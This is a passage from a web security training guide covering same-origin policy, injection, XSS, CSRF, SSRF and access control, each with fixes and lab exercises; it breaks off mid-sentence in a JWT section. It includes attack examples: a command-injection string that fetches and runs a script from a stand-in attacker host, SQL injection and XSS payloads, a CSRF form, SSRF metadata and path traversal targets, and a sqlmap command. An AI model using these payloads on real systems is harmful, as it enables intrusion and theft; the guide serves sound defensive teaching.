- [ ] I can explain ARP spoofing and the switch features that stop it
- [ ] I know exactly what an active attacker needs to MITM TLS, and why HSTS +
      CT + trust-store control usually prevent it
- [ ] I can explain the Kaminsky attack and why DNSSEC — not port randomisation
      — is the real fix
- [ ] I know the difference (and the pairing) between DNSSEC and DoH/DoT
- [ ] I can write a default-deny firewall ruleset with egress filtering
- [ ] I can state the zero-trust principle and why a VPN is not it
- [ ] **I stood up WireGuard between two machines and confirmed the tunnel is
      opaque on the wire**
- [ ] **I built a segmented SecureShop and verified the reachability matrix**
- [ ] **I ran a MITM lab and documented what each defence layer removed**
- [ ] I can capture, filter, and read traffic with tcpdump/Wireshark, and
      decrypt my own TLS

---

# Part 10 — Web and HTTP security

The application is where most breaches actually happen. A perfect TLS
configuration does nothing against SQL injection, a broken authorization check, or
a poisoned dependency. This Part is the attacker's-eye view of a web app, mapped
to the **OWASP Top 10**, with the fix for each.

## Chapter 41 — How the web decides what to trust

### In one sentence

Browser security rests on the **origin** (scheme + host + port) and the
**same-origin policy** that isolates one site's data from another's — and almost
every web vulnerability is a way to cross that boundary or abuse the server's
trust in a request.

### The origin

```
   ORIGIN = scheme  ://  host  :  port

     https://shop.securesh.op:443
     \___/     \____________/  \_/
     scheme       host        port

   Same origin ONLY if all three match exactly:
     https://shop.securesh.op        vs  http://shop.securesh.op    -> DIFFERENT (scheme)
     https://shop.securesh.op        vs  https://api.securesh.op    -> DIFFERENT (host)
     https://shop.securesh.op        vs  https://shop.securesh.op:8443 -> DIFFERENT (port)
     https://shop.securesh.op/a      vs  https://shop.securesh.op/b  -> SAME (path doesn't count)
```

"Site" is looser than "origin" — it's roughly the registrable domain
(`securesh.op`), ignoring scheme, port, and subdomain. Cookies and some newer
protections work at "site" granularity (eTLD+1). Know which one a given feature
uses.

### Same-Origin Policy (SOP)

The foundational rule: **script running on origin A cannot read data from origin
B.**

```
   A page on https://evil.example CAN:
     - send requests to https://bank.example (the request goes, with cookies!)
     - load bank.example images, scripts, styles, iframes
     - navigate to it, submit forms to it

   A page on https://evil.example CANNOT:
     - READ the response body from https://bank.example (SOP blocks it)
     - read bank.example's cookies, localStorage, or DOM (in an iframe)
```

That gap — "the request is sent with your cookies, but the attacker can't read
the reply" — is exactly why **CSRF** exists (the attacker doesn't need to read
the reply, just to cause the side effect) and why **CORS** was invented (to let
servers opt in to sharing responses).

### Cookies — the ambient credential

Cookies are attached to *every* matching request automatically. That convenience
is the root of a lot of pain. The attributes that matter:

```
   Set-Cookie: session=abc123;
       Secure;                  <- only sent over HTTPS
       HttpOnly;                <- JavaScript cannot read it (blunts XSS theft)
       SameSite=Lax;            <- not sent on most cross-site requests
                                   (Lax: sent on top-level GET navigation;
                                    Strict: never cross-site;
                                    None: always -- REQUIRES Secure)
       Path=/; Domain=securesh.op;
       Max-Age=3600;
       __Host- prefix           <- name prefix that ENFORCES Secure + Path=/
                                   + no Domain -> hardest to tamper with
```

**Defaults to set on every session cookie:** `Secure; HttpOnly; SameSite=Lax`
(or `Strict` for high-value), and use the `__Host-` name prefix.

### CORS — opting in to cross-origin reads

CORS is **not** a restriction you configure to be safe; it's the server telling
the browser "it's OK to let this other origin read my response".

```
   Browser (from https://app.example) --> GET https://api.example/data
                                          Origin: https://app.example

   api.example responds:
     Access-Control-Allow-Origin: https://app.example    <- echoes ONE origin
     Access-Control-Allow-Credentials: true              <- allow cookies/auth
     Vary: Origin

   The browser then lets app.example's JS read the body. Without these
   headers, the request still HAPPENED, but JS gets an opaque error.
```

**The classic CORS mistakes:**

```
   Access-Control-Allow-Origin: *  WITH  Allow-Credentials: true
     -> forbidden by spec, but misconfigs/reflectors bypass it. Means
        "any site can make authenticated calls and read the response."
   Reflecting the Origin header without an allowlist -> same thing.
   Allowing  null  origin -> sandboxed iframes / redirects can hit you.
   Treating CORS as an auth mechanism -> it isn't. Non-browser clients
     ignore it entirely. CORS protects the USER's browser, not your API.
```

### The OWASP Top 10 (2025) — the map for this Part

```
   A01  Broken Access Control            -> Ch 45   (still #1, by far)
   A02  Security Misconfiguration        -> Ch 41,47 (headers, defaults, CORS)
   A03  Software Supply Chain Failures   -> Ch 47
   A04  Cryptographic Failures           -> Parts 3-7 (weak/missing crypto,
                                           secrets in code, bad TLS)
   A05  Injection (incl. XSS)            -> Ch 42, 43
   A06  Insecure Design                  -> whole guide (threat model first)
   A07  Authentication Failures          -> Ch 46
   A08  Software & Data Integrity Failures -> Ch 47 (unsigned updates,
                                           insecure deserialization, CI/CD)
   A09  Logging & Alerting Failures      -> Part 11
   A10  Mishandling Exceptional Conditions -> Ch 44/45 (fail-open, verbose
                                           errors, bad error handling)
   (SSRF -> folded into A01/its own writeup) -> Ch 44
```

Rankings shuffle between editions; **the underlying bug classes are stable.**
Learn the classes.

### Practice (25 min)

```bash
# 1. Inspect real cookie hygiene
curl -sI https://github.com | grep -i set-cookie
curl -sI https://news.ycombinator.com | grep -i set-cookie
#   which have Secure / HttpOnly / SameSite? which don't?

# 2. Probe a CORS policy (safe, read-only)
curl -s -I -H 'Origin: https://evil.example' https://api.github.com/ | grep -i 'access-control'
curl -s -I -H 'Origin: https://evil.example' \
     -X OPTIONS https://api.github.com/ | grep -i 'access-control'
#   does it reflect your Origin? echo *? require credentials?

# 3. See SOP in your browser console (devtools on any page):
#    fetch('https://example.com').then(r=>r.text()).then(console.log)
#      -> blocked by CORS (you'll see the error; the request still went)

# 4. Security headers scan
curl -sI https://your-service.example | grep -iE \
  'content-security-policy|strict-transport|x-content-type|x-frame|referrer-policy|permissions-policy'
# or use: https://securityheaders.com  /  https://observatory.mozilla.org
```

### Common confusions

- **"CORS makes my API secure."** CORS relaxes SOP for browsers. It is not
  authentication or authorization, and non-browser clients ignore it. Your API
  still needs real authz on every endpoint.
- **"SameSite=Lax stops all CSRF."** It stops most cross-site POST/AJAX CSRF, but
  top-level `GET` navigations still send the cookie, and same-site subdomains can
  be a gap. Keep anti-CSRF tokens for state-changing requests (Ch 44).
- **"HttpOnly means XSS can't hurt me."** It stops *cookie theft* via JS. An XSS
  can still make authenticated requests as the user, read the page, keylog, etc.
- **"Origin and site are the same."** Origin = scheme+host+port (exact). Site =
  eTLD+1 (looser). Cookies use "site"; SOP uses "origin".

### Check yourself

1. What three components make up an origin? Are `http://x` and `https://x` the
   same origin?
2. Under SOP, what can `evil.example` do to `bank.example`, and what can't it?
3. What do `Secure`, `HttpOnly`, and `SameSite` each protect against?
4. Is `Access-Control-Allow-Origin: *` with credentials safe? What's the usual
   underlying mistake?
5. Does CORS protect your API from a Python script? Why/why not?

*(Answers: Appendix F.)*

### Further reading

- **Site:** MDN Web Docs — "Same-origin policy", "CORS", "Set-Cookie",
  "Content Security Policy". The reference.
- **Book:** *The Tangled Web*, Michal Zalewski — how browsers actually behave.
  Older but the model is unchanged and it's brilliant.
- **Site:** `web.dev/articles/same-site-same-origin` — the origin-vs-site
  explainer with diagrams.
- **Course:** PortSwigger Web Security Academy — "CORS" topic, with free labs.
- **Tool:** `securityheaders.com`, Mozilla Observatory.

---

## Chapter 42 — Injection: when data becomes code

### In one sentence

Injection happens when untrusted input is concatenated into a string that an
interpreter (SQL, shell, LDAP, a template engine) then parses, so the attacker's
data is executed as commands — and the universal fix is to keep data and code in
separate channels.

### The one idea behind every injection

```
   VULNERABLE:  build a command/query by STRING CONCATENATION with input.
     query = "SELECT * FROM users WHERE name = '" + name + "'"
                                                    ^^^^ attacker controls this

   name = "'; DROP TABLE users; --"
     -> SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
                                            ^^^^^^^^^^^^^^^^^ now it's CODE

   SAFE:  send code and data on SEPARATE channels. The interpreter gets the
   query STRUCTURE once, and the data as bound parameters it never parses.
     query = "SELECT * FROM users WHERE name = ?"
     execute(query, [name])          <- 'name' can never change the structure
```

This principle — **parameterise; never concatenate** — covers SQL, NoSQL, OS
commands, LDAP, XPath, and more.

### SQL injection

```
   IMPACT: read/modify/delete any data, bypass auth, sometimes RCE
   (xp_cmdshell, COPY TO PROGRAM, UDFs) and file access.

   AUTH BYPASS example:
     input password:  ' OR '1'='1
     SELECT id FROM users WHERE user='admin' AND pass='' OR '1'='1'
       -> returns a row -> "logged in"

   UNION-based extraction:
     ?id=1 UNION SELECT username, password, NULL FROM users--

   BLIND (no output, but behaviour differs):
     ?id=1 AND (SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a'
       -> page loads / doesn't -> extract one char at a time

   TIME-based blind (no visible difference at all):
     ?id=1; IF (condition) WAITFOR DELAY '0:0:5'--
       -> response is slow when the condition is true
```

**The fix — in order of preference:**

```
   1. PARAMETERISED QUERIES / prepared statements. Always. Every language
      has them.  db.execute("... WHERE id = ?", [id])
   2. Use an ORM / query builder correctly (they parameterise) -- but beware
      raw-query escape hatches and dynamic column/table names.
   3. For things that CAN'T be parameterised (identifiers, ORDER BY column,
      LIMIT in some drivers): validate against a strict ALLOWLIST of known
      values. Never escape-and-concatenate as your primary defence.
   4. Least-privilege DB accounts (the app's user can't DROP, can't read
      other schemas, can't write files).
   5. WAF as defence in depth, never as the fix.
```

### OS command injection

```
   VULNERABLE:
     os.system("ping -c 1 " + host)
     host = "8.8.8.8; curl evil.example/x.sh | sh"

   FIX: don't call a shell. Use the array form of exec, which passes
   arguments directly to the program with NO shell parsing:
     subprocess.run(["ping", "-c", "1", host])       # Python
     execFile("ping", ["-c","1", host])               # Node
   And still validate `host` (e.g. it must be a valid hostname/IP).
   NEVER: shell=True with interpolated input; backticks; eval.
```

### The other injection contexts

```
   LDAP injection    filter = "(uid=" + user + ")"  -> use parameterised
                     LDAP APIs / escape per RFC 4515 with a vetted library.
   XPath injection    same shape -> parameterised XPath / precompiled.
   Template injection (SSTI)  user input rendered AS a template
                     ({{7*7}} -> 49) -> can be RCE. Never put user input
                     into template SOURCE; pass it as DATA to a sandboxed
                     engine.
   NoSQL injection    Mongo: {"user": user, "pass": pass} where pass is the
                     object {"$ne": null} -> matches anything. Cast/validate
                     types; reject objects where you expect strings.
   Header / CRLF injection  input with \r\n into a response header ->
                     response splitting, cache poisoning. Frameworks mostly
                     block this now; still validate.
   Log injection      newlines/control chars into logs -> forged entries.
                     (Part 11.) Encode on write.
   ORM/GraphQL         raw fragments, batching abuse, alias-based DoS.
```

### Practice (40 min) — in the lab only

```
   Use OWASP Juice Shop (Ch 0.4) or PortSwigger Academy labs.

   1. SQL injection login bypass:
      - Log in as admin using ' OR 1=1-- in the email field. Observe the
        query shape from the error, then craft the payload.
   2. UNION extraction:
      - Find the products search endpoint. Determine the column count
        (ORDER BY n / UNION SELECT NULL,NULL,...). Extract the users table.
   3. Now FIX a copy locally:
      - Grab a deliberately-vulnerable mini-app (or write 20 lines of
        Flask/Express with a concatenated query). Confirm the injection.
      - Switch to a parameterised query. Confirm the SAME payload is now
        inert (it's treated as a literal string to match).
   4. Command injection:
      - In a lab app with a "ping" or "nslookup" feature, inject `; id`.
      - Fix it with the array/exec form + hostname validation. Re-test.
   5. Try `sqlmap` against your OWN lab target only:
        sqlmap -u 'http://localhost:3000/rest/products/search?q=x' --batch --dbs
      Read what it does; understand each stage. Never point it off your lab.
```

### Common confusions

- **"I escape quotes, so I'm safe."** Escaping is fragile — numeric contexts,
  second-order injection (stored then used later), different quoting rules,
  charset tricks. Parameterise.
- **"An ORM means no SQL injection."** Only for parameterised paths. `raw()`,
  `.extra()`, string-built `WHERE`, and dynamic `ORDER BY` reintroduce it.
- **"The WAF blocks SQLi."** WAFs are bypassable (comments, encoding, casing,
  novel gadgets). Defence in depth, not the fix.
- **"Command injection needs a shell metacharacter."** Argument injection (e.g. a
  filename starting with `-`) can be dangerous even without a shell. Validate
  values and use `--` end-of-options where supported.
- **"Stored data is trusted."** Second-order injection: input saved safely, then
  later concatenated into a query. Parameterise *every* query.

### Check yourself

1. State the single principle that defeats every injection class.
2. Show a parameterised version of `"...WHERE id = '" + id + "'"`.
3. What can't be parameterised, and what do you do instead?
4. How do you run an external command safely from code?
5. What is second-order (stored) injection?

### Further reading

- **Cheat sheets:** OWASP "SQL Injection Prevention", "Injection Prevention",
  "OS Command Injection Defense", "Query Parameterization" — concise and
  authoritative.
- **Course:** PortSwigger Web Security Academy — the SQL injection track is the
  best free hands-on resource anywhere.
- **Book:** *The Web Application Hacker's Handbook* (2nd ed.) — dated on specifics,
  excellent on method. Chapters 9–10.
- **Tool docs:** `sqlmap` wiki (lab use), and your language's DB-API
  parameterisation docs.

---

## Chapter 43 — Cross-site scripting (XSS)

### In one sentence

XSS is injection into a web page: the attacker gets their JavaScript to run in
your users' browsers in your site's origin, and from there can do anything the
user can.

### The three types

```
   STORED (persistent)   payload saved server-side (a comment, profile,
                         product review) and served to every viewer.
                         Worst impact -- can self-propagate (Samy worm).

   REFLECTED             payload in the request (query param, path) echoed
                         straight into the response. Needs a lure (a crafted
                         link). One victim per click.

   DOM-BASED            no server involvement: client-side JS reads
                         attacker-controlled input (location.hash,
                         postMessage, document.referrer) and writes it into
                         a dangerous sink (innerHTML, eval, document.write).
```

### Why it's dangerous

Once script runs in your origin it can:

```
   - read the DOM (everything on the page the user sees)
   - make authenticated requests as the user (SOP allows same-origin;
     cookies attach automatically)
   - read non-HttpOnly cookies, localStorage, sessionStorage
   - keylog, capture form input, phish with a fake login overlay
   - pivot: hit internal APIs the user's browser can reach
   - persist (service worker) and self-spread (stored XSS)
```

HttpOnly stops cookie *theft*; it does not stop any of the rest.

### The fix: context-aware output encoding + CSP

```
   ROOT CAUSE: putting untrusted data into HTML without encoding it for
   THAT context.

   1. CONTEXT-AWARE OUTPUT ENCODING (the primary fix)
        HTML body:        & < > -> &amp; &lt; &gt;
        HTML attribute:   also encode quotes; always quote attributes
        JavaScript:       don't. Serialise as JSON into a data attribute
                          or <script type="application/json">, then read it.
        URL:              percent-encode; validate the scheme (no javascript:)
        CSS:              avoid entirely; strict allowlist
      Modern frameworks (React, Angular, Vue, Svelte) auto-encode by
      default. XSS then comes from the ESCAPE HATCHES:
        React    dangerouslySetInnerHTML
        Angular  bypassSecurityTrust*
        Vue      v-html
        any      .innerHTML, document.write, jQuery .html(), eval,
                 new Function, setTimeout("string")

   2. FOR RICH HTML INPUT (user must submit formatted text):
        sanitise with a vetted library -- DOMPurify -- with a strict
        allowlist. Never a homemade regex "sanitiser".

   3. CONTENT SECURITY POLICY (defence in depth -- assume 1 & 2 will
      sometimes fail)
        Content-Security-Policy:
          default-src 'self';
          script-src 'self' 'nonce-<random-per-response>';
          object-src 'none'; base-uri 'none'; frame-ancestors 'none'
      - NO 'unsafe-inline', NO 'unsafe-eval', NO broad host allowlists
        (they're bypassable via JSONP/old Angular on those hosts).
      - Prefer a NONCE- or HASH-based, or STRICT-DYNAMIC policy.
      - Add a report-uri/report-to endpoint and watch it.

   4. Trusted Types (Chromium): make the DOM XSS sinks refuse plain
      strings -> forces all sink writes through a vetted policy.
        Content-Security-Policy: require-trusted-types-for 'script'
```

### Practice (40 min) — lab only

```
   1. Juice Shop / PortSwigger:
      - Reflected XSS: find a parameter echoed into the page. Pop
        alert(document.domain). Then escalate to reading a cookie or
        making an authenticated request in the console.
      - Stored XSS: get a payload into a field that's rendered to other
        users (a review, a name). Confirm it fires on page load.
      - DOM XSS: find JS that writes location.hash into innerHTML.
        Craft the URL.
   2. Fix locally:
      - 15-line app that reflects ?name= into HTML via string concat.
        Confirm <script>alert(1)</script> runs.
      - Add context-aware encoding (or use a templating engine with
        autoescape). Confirm the payload now renders as visible text.
      - Add a strict nonce-based CSP. In devtools, watch an inline
        <script> without the nonce get BLOCKED, and see the violation
        report.
   3. Add a "bio" field that allows <b>/<i>. Implement it with DOMPurify
      (allowlist b,i,em,strong only). Try to sneak <img onerror> past it.
   4. Score your headers: run the fixed app through securityheaders.com
      (local via ngrok, or read the curl -I output against the checklist).
```

### Common confusions

- **"I escape `<` and `>` so I'm safe."** Only for HTML *body* context. In an
  attribute without quotes, or in a `javascript:`/`href`, or inside a `<script>`,
  or in CSS — different rules. Encode for the context, or don't put data there.
- **"CSP fixes XSS."** CSP *mitigates* it. `unsafe-inline` or a sloppy host
  allowlist neuters it. Encoding is still the fix; CSP is the seatbelt.
- **"My framework auto-escapes, so no XSS."** True until someone uses
  `dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrust`, or builds a
  `javascript:` URL, or does client-side templating of user data.
- **"HttpOnly cookies make XSS low severity."** No. XSS = full control of the
  session in-browser regardless of cookie theft.
- **"A regex strips `<script>`."** Trivially bypassed (`<img onerror>`,
  `<svg onload>`, mixed case, nested, null bytes). Use DOMPurify.

### Check yourself

1. Name the three XSS types and the key difference of each.
2. With HttpOnly session cookies, what can an XSS still do? (List four.)
3. What is "context-aware output encoding" and why isn't one encoding enough?
4. What makes a CSP weak? Name two things that must NOT be in `script-src`.
5. How should you handle a field where users legitimately submit some HTML?

### Further reading

- **Cheat sheets:** OWASP "Cross Site Scripting Prevention", "DOM based XSS
  Prevention", "Content Security Policy".
- **Tool:** DOMPurify (`github.com/cure53/DOMPurify`) — read the README's threat
  model.
- **Course:** PortSwigger Academy — XSS track (huge, excellent) and the
  "Content Security Policy" material.
- **Talk:** "CSP: A Successful Mess Between Hardening and Mitigation" (Lukas
  Weichselbaum, Google) — why strict/nonce CSP beats allowlists.
- **Site:** Google's `csp-evaluator.withgoogle.com` — paste your policy, see the
  bypasses.

---

## Chapter 44 — Request forgery: CSRF, SSRF, clickjacking

### In one sentence

These attacks abuse *trust in a request's origin*: CSRF rides the user's
credentials from another site, SSRF makes your server fetch attacker-chosen URLs,
and clickjacking tricks the user into clicking your UI through an invisible
overlay.

### CSRF — Cross-Site Request Forgery

```
   The user is logged in to bank.example. They visit evil.example, which
   contains:

     <form action="https://bank.example/transfer" method="POST" id="f">
       <input name="to" value="attacker"><input name="amount" value="5000">
     </form>
     <script>f.submit()</script>

   The browser sends the POST to bank.example WITH the user's session
   cookie (SOP allows sending, just not reading the reply). The transfer
   goes through. The attacker never saw the response -- they didn't need to.
```

**Defences (use layered):**

```
   1. SameSite cookies:  SameSite=Lax (default in modern browsers) stops
      cross-site POST/AJAX from carrying the cookie. SameSite=Strict for
      high-value actions. NOT sufficient alone (top-level GET, some flows,
      older clients, same-site-but-different-origin).
   2. ANTI-CSRF TOKENS:  a per-session (or per-request) random token in a
      hidden field / custom header that the server verifies. The attacker's
      cross-site page can't read it (SOP). Synchronizer-token or
      signed double-submit pattern.
   3. Custom header requirement for JSON APIs:  require e.g.
      X-Requested-With or a custom content type that a cross-site HTML form
      cannot set -> forces a CORS preflight the attacker can't satisfy.
   4. Re-authentication / step-up for sensitive actions.
   5. Check Origin/Referer as defence in depth (not sole defence).
```

**GET must never change state.** A `GET /transfer?...` is CSRF-able with an
`<img>` tag and immune to most token schemes.

### SSRF — Server-Side Request Forgery

```
   Your server has a feature: "fetch the image at this URL", "import from
   this webhook", "render this PDF from a URL". The attacker supplies:

     http://169.254.169.254/latest/meta-data/iam/security-credentials/...
       -> cloud instance metadata service -> STEALS cloud credentials
          (this was the Capital One breach, 2019, ~100M records)
     http://localhost:6379/  -> internal Redis, admin panels, k8s API
     file:///etc/passwd       -> local file read
     http://[internal-only-service]/  -> pivot into the private network
     gopher://... / dict://   -> smuggle arbitrary protocol payloads
```

**Defences:**

```
   - Default DENY. Allowlist destination hosts/domains AND schemes
     (https only). Deny by default; never blocklist.
   - Resolve the hostname, check the RESULTING IP against RFC1918 /
     loopback / link-local / IPv6 ULA / metadata IPs -- BEFORE connecting,
     AND re-check after redirects (DNS rebinding: resolve twice, TOCTOU).
   - Disable redirects, or re-validate every hop.
   - Block the metadata endpoint at the network layer; use IMDSv2
     (session-token, hop-limit 1) on AWS; equivalent hardening on GCP/Azure.
   - Isolate the fetcher: a locked-down egress-filtered subnet / separate
     service / no cloud role attached.
   - No raw error/response passthrough (blind SSRF is still bad, but don't
     hand the attacker the loot).
```

### Clickjacking

```
   evil.example loads bank.example in a transparent <iframe>, positions a
   "You won! Click here" button exactly over bank.example's "Delete
   account" / "Confirm payment" button. The user clicks the real button
   without knowing.

   FIX (both):
     Content-Security-Policy: frame-ancestors 'none'      (or 'self' / allowlist)
     X-Frame-Options: DENY                                (legacy, still set it)
   For UIs that MUST be embeddable, use frame-ancestors with a tight
   allowlist and require user gestures / confirmations for destructive acts.
```

### Related: open redirects and tabnabbing

```
   OPEN REDIRECT:  /login?next=https://evil.example -> after login the app
     redirects off-site. Feeds phishing and can chain into OAuth token
     theft / SSRF filter bypass. Fix: allowlist redirect targets, or only
     allow relative paths.
   REVERSE TABNABBING:  target="_blank" links let the opened page rewrite
     window.opener.location. Fix: rel="noopener noreferrer" (now default
     in modern browsers, but set it).
```

### Practice (35 min) — lab only

```
   1. CSRF (Juice Shop / PortSwigger):
      - Find a state-changing endpoint without a token. Host a tiny
        auto-submitting form on a different origin (python -m http.server
        on another port counts as cross-site if the app checks Origin).
      - Add SameSite=Lax to the cookie; retry. Add a synchronizer token;
        retry. Document what each layer blocked.
   2. SSRF (PortSwigger has a dedicated track):
      - Use a URL-fetch feature to hit 169.254.169.254 (their lab
        simulates it) or an internal admin endpoint.
      - Implement the allowlist + post-resolution IP check fix in a local
        mini-app. Try to bypass with a redirect and with a DNS name that
        resolves to 127.0.0.1 (use `lvh.me` / `127.0.0.1.nip.io`).
   3. Clickjacking:
      - Frame a local app in an <iframe> on another page. Overlay a button.
      - Add frame-ancestors 'none'; watch the frame refuse to render.
```

### Common confusions

- **"SameSite=Lax killed CSRF, tokens are obsolete."** Lax has gaps (top-level
  GET, method overrides, same-site subdomain attacker, non-cookie auth is
  unaffected). Keep tokens for state-changing endpoints.
- **"CSRF matters for token/Authorization-header APIs."** If auth is a
  non-cookie bearer token that the browser doesn't attach automatically, classic
  CSRF doesn't apply. It's cookies/Basic/NTLM/client-certs — ambient
  credentials — that make CSRF work.
- **"SSRF is just an internal port scanner."** It's credential theft (metadata),
  RCE (internal admin panels), and network pivot. Capital One was SSRF.
- **"Blocklisting `localhost` and `127.0.0.1` stops SSRF."** `0.0.0.0`,
  `[::1]`, `2130706433` (decimal), `127.1`, DNS rebinding, redirects, and IPv6
  all bypass naive blocklists. Allowlist + post-resolution check.
- **"X-Frame-Options is enough."** It's legacy and lacks allowlist nuance. Use
  CSP `frame-ancestors`; keep XFO for old browsers.

### Check yourself

1. Why can a cross-site form submit to your app *with* the user's cookie but the
   attacker still can't read the response — and why does CSRF work anyway?
2. Name three CSRF defences and one gap in `SameSite=Lax`.
3. What is the cloud metadata endpoint, and which breach was SSRF to it?
4. Why is a blocklist the wrong approach to SSRF, and what's the right one
   (including the redirect/rebinding subtlety)?
5. Which header (modern) stops clickjacking, and what's its value for
   "never frame me"?

### Further reading

- **Cheat sheets:** OWASP "CSRF Prevention", "SSRF Prevention", "Clickjacking
  Defense".
- **Course:** PortSwigger Academy — CSRF and SSRF tracks (both excellent, free
  labs).
- **Write-up:** the Capital One breach (2019) technical analyses — SSRF →
  IMDSv1 → S3 exfiltration. Then read AWS's IMDSv2 announcement.
- **Article:** "SSRF bible" / Orange Tsai's SSRF talks (`blackhat` / `hitcon`) —
  protocol smuggling and parser confusion.

---

## Chapter 45 — Broken access control

### In one sentence

Access control is enforcing *who may do what to which object* — and it's OWASP's
#1 category because it must be checked on **every** request to **every** object,
server-side, and one missed check is a breach.

### The failure modes

```
   IDOR / BOLA (Broken Object-Level Authorization)
     GET /api/orders/1001   -> your order
     GET /api/orders/1002   -> someone else's order, returned happily
     The app checks you're LOGGED IN but not that the object is YOURS.
     #1 API vulnerability (OWASP API Top 10 A01). Also with UUIDs if they
     leak; obscurity is not authorization.

   BROKEN FUNCTION-LEVEL AUTHORIZATION (BFLA)
     POST /api/admin/users/5/promote  -> works for a normal user because
     the endpoint only checks authentication, or hides the button but not
     the route ("security by missing link").

   VERTICAL escalation: user -> admin.
   HORIZONTAL escalation: user A -> user B's data.

   MASS ASSIGNMENT / auto-binding
     PATCH /api/users/me  {"name":"x","role":"admin","credits":99999}
     The app binds the whole JSON to the model; you set fields you
     shouldn't. Fix: explicit allowlist of updatable fields (DTOs).

   PATH TRAVERSAL
     GET /download?file=../../../../etc/passwd
     GET /download?file=..%2f..%2f (encoded)  / ....// (filter bypass)
     Fix: resolve to a canonical absolute path, assert it's inside the
     intended base dir; better, use an opaque ID -> lookup, never a path.

   MISSING RE-CHECK ON SECOND STEP
     Multi-step flows (checkout, wizards) that authorize step 1 and trust
     hidden fields / prior state on step 3. Re-derive and re-check server-
     side at every step.

   METADATA / SIDE-CHANNEL access
     Referer leaks, predictable exports, GraphQL introspection,
     debug endpoints, .git/ , /actuator, backup files, verbose errors.
```

### The principles that prevent it

```
   1. DENY BY DEFAULT. Every route/handler requires an explicit allow.
      A new endpoint with no annotation must be UNREACHABLE, not public.
   2. ENFORCE SERVER-SIDE, on every request. The UI hiding a button is
      not access control. The client is attacker-controlled.
   3. CHECK THE OBJECT, not just the verb. "Can this user read THIS
      order?" -- scope every query by the owner:
        SELECT * FROM orders WHERE id = ? AND owner_id = :current_user
      (make ownership a WHERE clause, not an afterthought).
   4. CENTRALISE the decision. One authorization layer/middleware/policy
      engine (OPA, Cedar, Oso, your framework's guards), not ad-hoc `if`
      checks scattered per controller.
   5. USE OPAQUE, UNGUESSABLE IDs where you can (UUIDv4), but treat that
      as defence in depth -- still check ownership.
   6. LEAST PRIVILEGE everywhere: roles, scopes, DB grants, cloud IAM,
      service accounts. Time-box elevated access.
   7. LOG access-control decisions, especially denials, and alert on
      spikes (enumeration).
   8. TEST IT: for every endpoint, automated tests for "as another user",
      "as anonymous", "as lower role".
```

### The SecureShop callback

Chapter 4 asked you to record your instinct for "per-customer authz" and
"price-tampering". Here's the concrete version:

```
   GET /api/orders/:id
     BAD:   if (!session.user) return 401; return db.order(id)
     GOOD:  if (!session.user) return 401;
            order = db.query("SELECT * FROM orders WHERE id=? AND customer_id=?",
                             [id, session.user.id])
            if (!order) return 404      // 404, not 403 -> don't confirm existence

   POST /api/checkout
     BAD:   total = req.body.total          // client sends the price!
     GOOD:  recompute total server-side from cart items x current DB prices;
            ignore any client-supplied price/total/discount entirely.
            Validate the coupon server-side. (This is A01 + insecure design.)
```

### Practice (40 min) — lab only

```
   1. IDOR: in Juice Shop, view your basket, then change the basket ID in
      the request to another value. Retrieve someone else's basket.
      Then find the "view another user's order" variant.
   2. BFLA: find an admin-only API call (watch the admin UI in devtools).
      Call it directly as a normal user.
   3. Mass assignment: register or update a profile and add "role":"admin"
      (or "isAdmin":true) to the JSON body. Check if it sticks.
   4. Path traversal: find a file-serving endpoint; try ../ and encoded
      variants to escape the intended directory.
   5. FIX locally: build a 3-endpoint app (list my orders, get order by id,
      update profile). Introduce each bug, exploit it, then fix with:
      ownership in the WHERE clause; a role guard middleware; a field
      allowlist DTO; canonical-path containment check. Add tests that call
      each endpoint "as user B" and expect 404/403.
```

### Common confusions

- **"We use UUIDs, so no IDOR."** Unguessable != authorized. UUIDs leak (URLs,
  Referer, logs, other endpoints). Still check ownership.
- **"The frontend only shows admins the button."** The API is the boundary.
  Attackers call it directly.
- **"Role check at the top of the controller is enough."** Object-level checks are
  separate: right role, wrong object. Scope every data access by owner/tenant.
- **"Return 403 for someone else's object."** That confirms the object exists
  (enumeration). Prefer 404 for "not yours".
- **"We'll add authz tests later."** Access control is the #1 breach cause and the
  easiest to regress silently. Test from day one.

### Check yourself

1. What is IDOR/BOLA, and why do UUIDs not fully fix it?
2. Difference between vertical and horizontal privilege escalation.
3. What is mass assignment and the fix?
4. Why enforce access control server-side on every request, and why centralise
   it?
5. In `GET /api/orders/:id`, show the query that makes ownership part of the
   check. Why return 404 rather than 403?
6. Why must `POST /checkout` never trust a client-supplied total?

### Further reading

- **Cheat sheets:** OWASP "Authorization", "Access Control", "Insecure Direct
  Object Reference Prevention", "Mass Assignment".
- **List:** OWASP **API Security Top 10** — API1:BOLA and API5:BFLA are this
  chapter; the whole list is essential for anyone building APIs.
- **Course:** PortSwigger Academy — "Access control vulnerabilities" track.
- **Tools:** Authz policy engines — OPA/Rego, AWS Cedar, Oso, Casbin — read one's
  intro to see what "centralised" looks like.
- **Talk:** "The Bug Hunter's Methodology" (Jason Haddix) sections on access
  control and IDOR hunting.

---

## Chapter 46 — Authentication, sessions, and federated identity

### In one sentence

Authentication proves *who* is making a request; the hard parts are storing
credentials safely (done in Ch 10), managing sessions, resisting phishing, and —
when you delegate to Google/Okta/etc. — getting OAuth 2.0 and OIDC exactly right.

### Sessions: the two models

```
   SERVER-SIDE SESSIONS (stateful)
     cookie = opaque random 128-bit session ID -> server looks up session
     data in a store (Redis, DB).
     + trivial to revoke (delete the row), rotate, inspect
     + no sensitive data on the client
     - needs a shared/replicated store

   STATELESS TOKENS (JWT et al.)
     cookie/header = signed token containing claims (sub, exp, roles)
     + no server lookup; scales across services
     - REVOCATION IS HARD (token is valid until exp regardless)
     - footgun-rich (see below)
     - claims are readable by the client (Ch 6) -- never put secrets in
   Common middle ground: short-lived JWT access token (5-15 min) +
   long-lived opaque refresh token stored server-side and revocable.
```

**Session hygiene, both models:**

```
   [ ] Generate IDs with a CSPRNG, >=128 bits.
   [ ] Set Secure; HttpOnly; SameSite=Lax|Strict; __Host- prefix.
   [ ] ROTATE the session ID on privilege change (login, step-up) ->
       defeats session fixation.
   [ ] Idle timeout + absolute timeout. Invalidate server-side on logout.
   [ ] Bind minimally to context (e.g. re-auth on IP/UA change for
       high-value) -- carefully, mobile users roam.
   [ ] One place to list & revoke a user's active sessions.
```

### JWT: the specific footguns

```
   alg:none        -> some libraries accepted an unsigned token as valid.
                      Pin the expected algorithm; reject 'none'.
   alg confusion    -> token says RS256 but server verifies with the RSA
